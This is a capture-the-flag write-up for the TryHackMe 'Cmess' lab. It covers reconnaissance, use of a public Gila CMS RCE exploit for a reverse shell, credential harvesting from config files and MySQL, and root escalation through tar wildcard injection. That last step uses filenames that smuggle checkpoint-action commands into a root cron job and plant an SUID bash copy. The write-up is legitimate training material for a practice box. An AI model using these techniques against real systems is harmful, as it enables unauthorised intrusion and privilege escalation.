---
title: "Cmess"
date: 2024-03-09
draft: false
summary: "Writeup for Cmess CTF challenge on TryHackMe."
tags: ["linux", "hardcoded creds", "cron"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/cmess/cover.webp"
  caption: "Cmess TryHackMe Challenge"
  alt: "Cmess cover"
platform: "TryHackMe"
---

Can you root this Gila CMS box?
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/cmess

## Reconnaissance

I added the machine hostname to my *hosts* file for proper name resolution. I then performed an **nmap** aggressive scan to find open ports, services running on them, and perform default script scans.

```shell
nmap -A -p- TARGET -oN cmess.nmap --min-rate 10000
```

![](https://cdn.ziomsec.com/cmess/2.webp)

## Foothold

The script scan discovered *robots.txt* file so I accessed it to discover 3 more endpoints.

![](https://cdn.ziomsec.com/cmess/3.webp)

I also brute forced directories using **ffuf** and found an admin login panel.

```shell
ffuf -u http://cmess.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

![](https://cdn.ziomsec.com/cmess/4.webp)

![](https://cdn.ziomsec.com/cmess/5.webp)

I then looked for subdomains and found 1. I added the subdomain to my *hosts* file for correct resolution.

```shell
ffuf -u http://cmess.thm -H "Host: FUZZ.cmess.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,302,301 -fw 522
```

![](https://cdn.ziomsec.com/cmess/6.webp)

I then accessed the subdomain and found the credentials for *andre*.

![](https://cdn.ziomsec.com/cmess/8.webp)

I logged in and got information about the CMS being used and its version.

![](https://cdn.ziomsec.com/cmess/9.webp)

I searched **exploit-db** for exploits related to this CMS and found an RCE exploit for the version being used on the target.

```shell
searchsploit 'Gila CMS'
```

![](https://cdn.ziomsec.com/cmess/10.webp)

I downloaded the exploit and started a **netcat** listener. Upon execution, I got a reverse shell.

```shell
searchsploit -m php/webapps/51569.py
```

```shell
nc -lnvp 1234
```

![](https://cdn.ziomsec.com/cmess/12.webp)

![](https://cdn.ziomsec.com/cmess/13.webp)

I navigated to the *home* directory but was unable to access the contents of *andre*.

![](https://cdn.ziomsec.com/cmess/14.webp)

I read the configuration files and found a few credentials. I also discovered an **SQL** service running internally and credentials for it.

![](https://cdn.ziomsec.com/cmess/15.webp)

![](https://cdn.ziomsec.com/cmess/16.webp)

```shell
netstat -antp
```

![](https://cdn.ziomsec.com/cmess/17.webp)

I connected to the **SQL** service running and found a hash for *andre*.

```
mysql -u root -p
```

![](https://cdn.ziomsec.com/cmess/20.webp)

I found the hash type (bcrypt) from the **hashcat** hash example's page and tried cracking the hash. However, I failed.
- https://hashcat.net/wiki/doku.php?id=example_hashes

I did further recon and found a password file in the */opt* directory that contained *andre*'s backup password.

![](https://cdn.ziomsec.com/cmess/22.webp)

I used the password to log in as *andre* using **ssh** and captured the user flag from the home directory.

![](https://cdn.ziomsec.com/cmess/23.webp)

## Privilege Escalation

I then downloaded **linux-smart-enumeration** on the target and ran it to find ways for privilege escalation.
- https://github.com/diego-treitos/linux-smart-enumeration

It found I was able to read a backup file in the */tmp* directory.

![](https://cdn.ziomsec.com/cmess/26.webp)

It also found a cronjob that backed up contents inside the */home/andre/backup* directory.

![](https://cdn.ziomsec.com/cmess/27.webp)

I visited the directory and found a note.

![](https://cdn.ziomsec.com/cmess/28.webp)

I copied **/bin/bash** to */tmp/bash* and granted it **suid** allowing execution as root. I then created a special filename that tricked **tar** into triggering a checkpoint every 1 file processed. I then abused **tar**'s ability to execute commands at a checkpoint by creating another file.

Hence, when **tar** processed it, it will execute **`sh evil.sh`**. So when the cron job runs the `tar` command, it triggers a checkpoint every 1 file, executes **evil.sh** and runs this as root creating an **suid** bit on */tmp/bash*.

```
echo 'cp /bin/bash /tmp/bash; chmod u+s /tmp/bash' > evil.sh
touch "/home/andre/backup/--checkpoint=1"
touch "/home/andre/backup/--checkpoint-action=exec=sh evil.sh"
```

![](https://cdn.ziomsec.com/cmess/29.webp)

After a while, I checked the */tmp* directory to find my file being successfully executed.

![](https://cdn.ziomsec.com/cmess/30.webp)

I then spawned a privilege **bash** shell and got root access.

```
/tmp/bash -p
```

![](https://cdn.ziomsec.com/cmess/31.webp)

I captured the root flag from the */root*.

```
cat /root/root.txt
```

![](https://cdn.ziomsec.com/cmess/32.webp)

That's it from my side, until next time!

---
